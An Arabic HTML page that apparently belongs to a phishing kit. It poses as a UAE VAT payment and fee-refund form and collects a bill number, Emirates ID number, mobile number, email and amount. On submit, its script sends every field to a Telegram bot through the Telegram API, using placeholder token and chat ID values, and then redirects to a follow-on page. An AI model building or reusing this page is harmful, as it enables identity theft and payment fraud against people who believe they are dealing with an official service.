<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال بيانات المستخدم</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="card header-card">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044286479/aPMsccGlDoDqOtLn.jpg" alt="Logo" class="logo">
            <h1 class="main-title-green">إدخال بيانات المستخدم</h1>
        </div>

        <div class="card form-card">
            <form id="dataForm">
                <div class="input-group">
                    <label>رقم الفاتورة</label>
                    <input type="text" id="billNumber" maxlength="6" pattern="\d{6}" title="يجب إدخال 6 أرقام فقط" placeholder="XXXXXX" required>
                </div>

                <div class="input-group">
                    <label>رقم الهوية</label>
                    <input type="text" id="idNumber" maxlength="18" placeholder="784-XXXX-XXXXXXX-X" required>
                </div>

                <div class="input-group">
                    <label>رقم الجوال</label>
                    <input type="tel" id="phoneNumber" maxlength="10" placeholder="05XXXXXXXX" pattern="^05[0245568]\d{7}$" title="يرجى إدخال رقم هاتف إماراتي صحيح (10 أرقام)" required>
                </div>

                <div class="input-group">
                    <label>البريد الإلكتروني</label>
                    <input type="email" id="email" placeholder="example@domain.com" required>
                </div>

                <div class="input-group">
                    <label>نوع الخدمة</label>
                    <select id="serviceType" required>
                        <option value="" disabled selected>اختر نوع الخدمة</option>
                        <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
                        <option value="استرداد الرسوم المدفوعة">استرداد الرسوم المدفوعة</option>
                    </select>
                </div>

                <div class="input-group">
                    <label>(درهم إماراتي) مبلغ السداد</label>
                    <div class="amount-container">
                        <span class="currency">AED</span>
                        <input type="number" id="amount" placeholder="0.00" step="0.01" required>
                    </div>
                </div>

                <button type="submit" class="cta-button">تأكيد البيانات</button>
            </form>
        </div>
    </div>

    <script>
        // تنسيق تلقائي لرقم الهوية أثناء الكتابة
        document.getElementById('idNumber').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = "";
            if (value.length > 0) formatted += value.substring(0, 3);
            if (value.length > 3) formatted += "-" + value.substring(3, 7);
            if (value.length > 7) formatted += "-" + value.substring(7, 14);
            if (value.length > 14) formatted += "-" + value.substring(14, 15);
            e.target.value = formatted;
        });

        // منع إدخال غير الأرقام في حقل الفاتورة والجوال
        const numericFields = ['billNumber', 'phoneNumber'];
        numericFields.forEach(id => {
            document.getElementById(id).addEventListener('keypress', function (e) {
                if (e.which < 48 || e.which > 57) e.preventDefault();
            });
        });

        const telegramToken = "YOUR_BOT_TOKEN"; 
        const telegramChatId = "YOUR_CHAT_ID";

        document.getElementById('dataForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // تحقق إضافي من طول الهوية
            if(document.getElementById('idNumber').value.length < 18) {
                alert("رقم الهوية الإماراتية غير مكتمل");
                return;
            }

            const message = `
🔔 **طلب سداد جديد**
--------------------------
📄 رقم الفاتورة: ${document.getElementById('billNumber').value}
🆔 رقم الهوية: ${document.getElementById('idNumber').value}
📱 رقم الجوال: ${document.getElementById('phoneNumber').value}
📧 البريد: ${document.getElementById('email').value}
🛠 الخدمة: ${document.getElementById('serviceType').value}
💰 المبلغ: ${document.getElementById('amount').value} AED
            `;

            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: telegramChatId, text: message })
            }).then(() => {
                window.location.href = "page3.html";
            }).catch(() => alert("خطأ في الاتصال"));
        });
    </script>
</body>
</html>
